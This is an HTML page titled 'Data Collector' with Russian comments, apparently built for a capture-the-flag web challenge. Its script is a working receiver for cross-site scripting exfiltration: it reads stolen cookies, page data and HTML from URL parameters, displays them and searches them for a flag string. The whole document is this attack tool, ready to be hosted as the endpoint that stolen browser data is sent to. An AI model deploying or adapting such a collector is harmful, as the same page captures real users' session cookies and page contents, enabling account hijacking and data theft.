<!DOCTYPE html>
<html>
<head>
    <title>Data Collector</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        h1, h2, h3 {
            color: #4CAF50;
        }
        pre {
            background-color: #1e1e1e;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .section {
            margin: 20px 0;
            border: 1px solid #333;
            padding: 15px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>🎯 Data Collector Active</h1>
    <div id="status">Waiting for data...</div>
    <div id="output"></div>
    
    <script>
        // Получаем параметры из URL
        const urlParams = new URLSearchParams(window.location.search);
        const cookies = urlParams.get('c');
        const data = urlParams.get('data');
        const html = urlParams.get('html');
        const flag = urlParams.get('flag');
        
        let output = '';
        let hasData = false;
        
        if (cookies) {
            hasData = true;
            output += '<div class="section"><h3>🍪 Cookies:</h3><pre>' + escapeHtml(cookies) + '</pre></div>';
        }
        
        if (data) {
            hasData = true;
            output += '<div class="section"><h3>📄 Data:</h3><pre>' + escapeHtml(decodeURIComponent(data)) + '</pre></div>';
        }
        
        if (html) {
            hasData = true;
            output += '<div class="section"><h3>📝 HTML:</h3><pre>' + escapeHtml(decodeURIComponent(html)) + '</pre></div>';
        }
        
        if (flag) {
            hasData = true;
            output += '<div class="section"><h3>🚩 FLAG:</h3><pre style="color: #4CAF50; font-size: 1.5em;">' + escapeHtml(decodeURIComponent(flag)) + '</pre></div>';
        }
        
        // Показываем все параметры
        if (window.location.search) {
            output += '<div class="section"><h3>🔗 Full URL:</h3><pre>' + escapeHtml(window.location.href) + '</pre></div>';
            output += '<div class="section"><h3>📋 All params:</h3><pre>' + escapeHtml(window.location.search) + '</pre></div>';
        }
        
        if (hasData) {
            document.getElementById('status').innerHTML = '<h2 style="color: #4CAF50;">✅ Data Received!</h2>';
            document.getElementById('output').innerHTML = output;
            
            // Пытаемся найти флаг в полученных данных
            const allText = (cookies || '') + (data || '') + (html || '');
            const flagMatch = allText.match(/flag\{[^}]+\}/i) || allText.match(/FLAG\{[^}]+\}/i);
            if (flagMatch) {
                document.getElementById('output').innerHTML = 
                    '<div class="section" style="border: 2px solid #4CAF50;"><h2>🎉 FLAG FOUND!</h2><pre style="color: #4CAF50; font-size: 2em;">' + 
                    escapeHtml(flagMatch[0]) + '</pre></div>' + output;
            }
        }
        
        // Функция для экранирования HTML
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Логируем в консоль для отладки
        console.log('URL Parameters:', {
            cookies: cookies,
            data: data,
            html: html,
            flag: flag,
            fullUrl: window.location.href
        });
    </script>
</body>
</html>
